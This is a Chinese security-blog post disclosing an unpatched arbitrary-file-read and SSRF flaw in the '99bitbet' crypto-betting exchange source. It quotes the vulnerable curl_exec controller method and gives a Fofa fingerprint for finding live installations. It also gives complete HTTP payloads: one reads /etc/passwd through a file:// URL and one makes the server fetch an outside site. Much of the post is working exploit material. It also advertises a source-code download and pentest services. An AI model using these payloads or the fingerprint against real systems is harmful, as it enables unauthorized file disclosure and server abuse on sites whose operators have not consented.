#  【0day】99bitbet双语言交易所存在前台任意文件读取漏洞   
原创 Mstir  星悦安全   2024-12-17 12:13  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**99bitbet双语言Usdt竞猜源码/海外PC28虚拟货币竞猜玩法/根据虚拟货币行情走势自动开奖结算/带预设开奖结果，****首页加了一个k线图表走势，只是为了美观，不做其他用途，自己研究。**  
  
**Fofa指纹:****"/vue/mainbg.png"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5d8vXH9IUQXiblqfFfDTcBRdEYTSZXW2icibl5M6tS8zReQOibzuJLoBvuXd3IQZKicEbR8jEWNZw2nECg/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5d8vXH9IUQXiblqfFfDTcBRdlkiccgUvnJPHJQyXuQhRHB0a5M6v8nupzbFe2YgkZ9Pzjl7v5MibRPOg/640?wx_fmt=png&from=appmsg "")  
  
**框架:ThinkCMF Debug:False**  
## 0x01 漏洞分析&复现  
  
**位于 /card/controller/CardController.php 控制器的toPost方法存在Curl_exec函数，且传参 str,url均可控，导致漏洞产生.**  
  
```
public function toPost($str,$url,$second=30){  
  //初始化curl       
  $ch = curl_init();
  //设置超时
  curl_setopt($ch, CURLOPT_TIMEOUT, $second);
  //这里设置代理，如果有的话
  //curl_setopt($ch,CURLOPT_PROXY, '8.8.8.8');
  //curl_setopt($ch,CURLOPT_PROXYPORT, 8080);
  curl_setopt($ch,CURLOPT_URL, $url);
  curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);
  curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,FALSE);
  //设置header
  curl_setopt($ch, CURLOPT_HEADER, FALSE);
  //要求结果为字符串且输出到屏幕上
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  //post提交方式
  curl_setopt($ch, CURLOPT_POST, TRUE);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $str);
  //运行curl
  $data = curl_exec($ch);
  //返回结果

  if($data){
    curl_close($ch);
    return $data;
  }else{
    $error = curl_errno($ch);
    echo "ERR";
    curl_close($ch);
    return false;
  }

```  
  
  
**Payload:**  
```
GET /card/card/toPost?str=1&url=file:///etc/passwd HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Cookie: thinkphp_show_page_trace=0|0; PHPSESSID=1quhk8vc3a0e6hf9gu7h3nc5qm; think_var=en
Host: 127.0.0.1:81
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5d8vXH9IUQXiblqfFfDTcBRdia5Y4Rm69tdbicFM00aHEAiaeqnXYDPhRAbhBZJ4P6DUice40hmicdrSIbQ/640?wx_fmt=jpeg&from=appmsg "")  
```
GET /card/card/toPost?str=1&url=https://www.baidu.com HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Cookie: thinkphp_show_page_trace=0|0; PHPSESSID=1quhk8vc3a0e6hf9gu7h3nc5qm; think_var=en
Host: 127.0.0.1:81
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5d8vXH9IUQXiblqfFfDTcBRdkUYQV7xQBAWJ3bDZGxoibetyTAic8jZaNunpMm1iaOuT5AqnNxdMHzb6Q/640?wx_fmt=jpeg&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**99bit源码关注公众号发送 241217 获取!**  
  
  
  
  
  
****  
**承接代码审计，众测，驻场，渗透测试，攻防演练等项目，CNVD证书全网最低价+VX: Lonely3944**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
